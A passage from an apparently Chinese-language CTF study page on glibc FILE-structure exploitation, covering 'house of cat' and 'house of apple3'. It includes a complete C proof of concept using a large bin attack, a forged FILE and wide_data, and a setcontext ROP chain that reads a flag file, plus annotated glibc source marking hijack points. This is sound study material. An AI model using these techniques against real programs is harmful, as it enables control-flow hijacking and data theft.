class="line"></span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a><a class="link"   href="https://bbs.kanxue.com/thread-273895.htm" >house of cat <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p> <code>house of apple2</code> 的一条路线之一。</p>
<h2 id="利用-IO-wfile-seekoff函数控制程序执行流"><a href="#利用-IO-wfile-seekoff函数控制程序执行流" class="headerlink" title="利用_IO_wfile_seekoff函数控制程序执行流"></a>利用_IO_wfile_seekoff函数控制程序执行流</h2><h3 id="相关配置-3"><a href="#相关配置-3" class="headerlink" title="相关配置"></a>相关配置</h3><p>对 <code>_IO_FILE_plus</code> 的设置如下：</p>
<ul>
<li><code>_flags</code> 设置为 <code>~0x8</code>，如果不能保证 <code>_lock</code> 指向可读写内存则 <code>_flags |= 0x8000</code>。</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_seekoff</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code> ，即满足<code>*A &gt; *(A + 8)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<h3 id="函数调用链-3"><a href="#函数调用链-3" class="headerlink" title="函数调用链"></a>函数调用链</h3><p><code>_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode-&gt;_IO_WOVERFLOW-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">do_ftell_wide</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 需要 _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 调用 _IO_WOVERFLOW</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		  fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: stderr -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> stderr_addr = libc_base + <span class="number">0x3b87a0</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="type">size_t</span> *payload = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = stderr_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> IO_wfile_jumps_addr = libc_base + <span class="number">0x3b3f40</span>;</span><br><span class="line">    <span class="comment">// mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]</span></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x121a90</span>; </span><br><span class="line">    <span class="type">size_t</span> pop_rax_ret = libc_base + <span class="number">0x3aaa8</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = libc_base + <span class="number">0x23256</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rsi_ret = libc_base + <span class="number">0x2d89f</span>;</span><br><span class="line">    <span class="type">size_t</span> syscall_ret = libc_base + <span class="number">0x3ac69</span>;</span><br><span class="line">    <span class="type">size_t</span> ret = pop_rax_ret + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake file</span></span><br><span class="line">    large[<span class="number">-2</span>] &amp;= ~<span class="number">0x8</span>; <span class="comment">// _flags &amp;= ~0x8</span></span><br><span class="line">    large[<span class="number">-1</span>] = (<span class="type">size_t</span>) payload;</span><br><span class="line">    large[<span class="number">25</span>] = IO_wfile_jumps_addr + <span class="number">0x10</span>; <span class="comment">// vtable -&gt; _IO_wfile_jumps + 0x10</span></span><br><span class="line">    large[<span class="number">15</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    large[<span class="number">18</span>] = (<span class="type">size_t</span>) unsorted;<span class="comment">// _wide_data</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake _wide_data</span></span><br><span class="line">    unsorted[<span class="number">4</span>] = (<span class="type">size_t</span>) (<span class="number">-1</span>); <span class="comment">//_IO_write_ptr</span></span><br><span class="line">    unsorted[<span class="number">28</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">//_wide_vtable</span></span><br><span class="line">    unsorted[<span class="number">3</span>] = (<span class="type">size_t</span>) magic_gadget;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SigreturnFrame</span></span><br><span class="line">    payload[<span class="number">4</span>] = (<span class="type">size_t</span>) setcontext + <span class="number">53</span>;</span><br><span class="line">    payload[<span class="number">13</span>] = (<span class="type">size_t</span>) buf; <span class="comment">// rdi -&gt; &quot;./flag&quot;</span></span><br><span class="line">    payload[<span class="number">14</span>] = <span class="number">0</span>; <span class="comment">// rsi = 0</span></span><br><span class="line">    payload[<span class="number">17</span>] = <span class="number">0x100</span>; <span class="comment">// rdx = 0x100 read 0x100 bytes</span></span><br><span class="line">    payload[<span class="number">20</span>] = (<span class="type">size_t</span>) &amp;payload[<span class="number">31</span>]; <span class="comment">// rsp -&gt; fake stack</span></span><br><span class="line">    payload[<span class="number">21</span>] = ret; <span class="comment">// rip -&gt; ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop</span></span><br><span class="line">    payload[<span class="number">31</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">32</span>] = <span class="number">2</span>;</span><br><span class="line">    payload[<span class="number">33</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">34</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">35</span>] = <span class="number">0</span>;</span><br><span class="line">    payload[<span class="number">36</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">37</span>] = <span class="number">3</span>;</span><br><span class="line">    payload[<span class="number">38</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">39</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">40</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">41</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">42</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">43</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">44</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">45</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">46</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">47</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// __malloc_assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_chunk_addr = unsorted + <span class="number">0x124</span>;</span><br><span class="line">    top_chunk_addr[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a><a class="link"   href="https://bbs.kanxue.com/thread-273863.htm#msg_header_h2_1" >house of apple3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p><strong>前置条件</strong></p>
<p>如果<code>_wide_data</code>设置不当的话会影响某些利用链的分支走向。但采用默认的<code>_wide_data</code>成员（默认会指向<code>_IO_wide_data_2</code>，除了<code>_wide_vtable</code>外其他成员均默认为<code>0</code>），也并不影响<code>house of apple3</code>的利用。因此，如果能伪造整个<code>FILE</code>结构体，则需要设置合适的<code>_wide_data</code>；如果只能伪部分<code>FILE</code>的成员的话，保持<code>fp-&gt;_wide_data</code>为默认地址即可。</p>
<ul>
<li>已知<code>heap</code>地址和<code>glibc</code>地址</li>
<li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li>
<li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_codecvt</code>，一般使用<code>largebin attack</code>去控制</li>
</ul>
<h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。该结构体参与宽字符的转换工作，结构体相关定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">__gconv_step</span> *step;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">__gconv_step_data</span> step_data;</span><br><span class="line">&#125; _IO_iconv_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__gconv_step</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">__gconv_loaded_object</span> *__shlib_handle; <span class="comment">// 关注这个成员</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"></span><br><span class="line">  __gconv_fct __fct;</span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__data;		<span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__gconv_step_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">				 buffer.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;	<span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">			   any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>house of apple3</code>的利用主要关注三个函数：<code>__libio_codecvt_in</code>、<code>__libio_codecvt_out</code>和<code>__libio_codecvt_length</code>。三个函数的利用点都差不多。</p>
<p><strong>__libio_codecvt_in</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Type of a conversion function.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(<span class="keyword">struct</span> __gconv_step *, <span class="keyword">struct</span> __gconv_step_data *,</span></span><br><span class="line"><span class="params">			    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *,</span></span><br><span class="line"><span class="params">			    <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">size_t</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">  <span class="comment">// gs 源自第一个参数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line">  <span class="comment">// 如果gs-&gt;__shlib_handle不为空，则会用__pointer_guard去解密</span></span><br><span class="line">  <span class="comment">// 这里如果可控，设置为NULL即可绕过解密</span></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 这里有函数指针调用</span></span><br><span class="line">  <span class="comment">// 这个宏就是调用fct(gs, ...)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">			(gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">			 (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">			 &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  *from_stop = (<span class="type">const</span> <span class="type">char</span> *) from_start_copy;</span><br><span class="line">  *to_stop = (<span class="type">wchar_t</span> *) codecvt-&gt;__cd_in.step_data.__outbuf;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (status)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __GCONV_OK:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_EMPTY_INPUT:</span><br><span class="line">      result = __codecvt_ok;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> __GCONV_FULL_OUTPUT:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_INCOMPLETE_INPUT:</span><br><span class="line">      result = __codecvt_partial;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = __codecvt_error;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>__libio_codecvt_out</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_out</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">		     <span class="title">const</span> <span class="title">wchar_t</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">wchar_t</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">		     <span class="title">const</span> <span class="title">wchar_t</span> **<span class="title">from_stop</span>, <span class="title">char</span> *<span class="title">to_start</span>, <span class="title">char</span> *<span class="title">to_end</span>,</span></span><br><span class="line"><span class="class">		     <span class="title">char</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_out.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">  codecvt-&gt;__cd_out.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_out.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_out.step_data.__statep = statep;</span><br><span class="line"></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">			(gs, &amp;codecvt-&gt;__cd_out.step_data, &amp;from_start_copy,</span><br><span class="line">			 (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">			 &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  *from_stop = (<span class="type">wchar_t</span> *) from_start_copy;</span><br><span class="line">  *to_stop = (<span class="type">char</span> *) codecvt-&gt;__cd_out.step_data.__outbuf;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (status)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __GCONV_OK:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_EMPTY_INPUT:</span><br><span class="line">      result = __codecvt_ok;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> __GCONV_FULL_OUTPUT:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_INCOMPLETE_INPUT:</span><br><span class="line">      result = __codecvt_partial;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = __codecvt_error;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>__libio_codecvt_length</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libio_codecvt_length (<span class="keyword">struct</span> _IO_codecvt *codecvt, <span class="type">__mbstate_t</span> *statep,</span><br><span class="line">			<span class="type">const</span> <span class="type">char</span> *from_start, <span class="type">const</span> <span class="type">char</span> *from_end,</span><br><span class="line">			<span class="type">size_t</span> max)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *cp = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line">  <span class="type">wchar_t</span> to_buf[max];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line"></span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_buf;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) &amp;to_buf[max];</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  DL_CALL_FCT (fct,</span><br><span class="line">	       (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;cp,</span><br><span class="line">		(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">		&amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  result = cp - (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-IO-wfile-underflow函数控制程序执行流"><a href="#利用-IO-wfile-underflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow函数控制程序执行流"></a>利用_IO_wfile_underflow函数控制程序执行流</h2><h3 id="相关配置-4"><a href="#相关配置-4" class="headerlink" title="相关配置"></a>相关配置</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
